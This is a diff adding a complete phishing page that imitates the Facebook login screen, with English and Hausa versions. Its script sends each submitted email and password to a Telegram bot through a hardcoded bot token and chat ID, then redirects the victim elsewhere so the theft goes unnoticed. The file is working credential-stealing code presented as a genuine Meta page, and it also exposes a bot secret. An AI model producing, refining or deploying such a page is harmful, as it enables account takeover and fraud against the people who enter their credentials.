@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .modal {
+      background: white;
+      width: 100%;
+      max-width: 360px;
+      padding: 1.5rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    .logo img {
+      width: 150px;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #1877f2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .lang-select {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #555;
+    }
+    select {
+      padding: 6px;
+      margin-top: 8px;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 0.8rem;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <div class="logo">
+      <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook Logo">
+    </div>
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Email address or phone number" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="lang-select">
+      <span id="lang-label">Language:</span>
+      <select id="lang">
+        <option value="en">English</option>
+        <option value="ha">Hausa</option>
+      </select>
+    </div>
+    <div class="footer">
+      &copy; 2025 Meta
+    </div>
+  </div>
+
+  <script>
+    const langText = {
+      en: {
+        email: "Email address or phone number",
+        password: "Password",
+        login: "Log In",
+        lang: "Language:"
+      },
+      ha: {
+        email: "Adireshin Imel ko lambar waya",
+        password: "Kalmar sirri",
+        login: "Shiga",
+        lang: "Harshe:"
+      }
+    };
+
+    const telegramToken = "8288085823:AAH8b7zwmzoG5zYezRJEllFi8IrgLur1C4Q";
+    const telegramChatId = "7869178295";
+
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+    const loginBtn = document.querySelector("button");
+    const langSelect = document.getElementById("lang");
+    const langLabel = document.getElementById("lang-label");
+
+    function updateLanguage(lang) {
+      emailInput.placeholder = langText[lang].email;
+      passwordInput.placeholder = langText[lang].password;
+      loginBtn.textContent = langText[lang].login;
+      langLabel.textContent = langText[lang].lang;
+    }
+
+    function detectLanguage() {
+      const lang = navigator.language.startsWith("ha") ? "ha" : "en";
+      langSelect.value = lang;
+      updateLanguage(lang);
+    }
+
+    langSelect.addEventListener("change", () => {
+      updateLanguage(langSelect.value);
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      const selectedLang = langSelect.value;
+
+      const msg = `🔐 New Facebook Login\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+      const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+      fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: msg
+        })
+      });
+
+      // Redirect after sending
+      setTimeout(() => {
+        if (selectedLang === "ha") {
+          window.location.href = "https://sarikin-dagomashabiru.vercel.app/ha";
+        } else {
+          window.location.href = "https://your-default-redirect.com";
+        }
+      }, 1000);
+    });
+
+    detectLanguage(); // Auto set on load
+  </script>
+</body>
+</html>
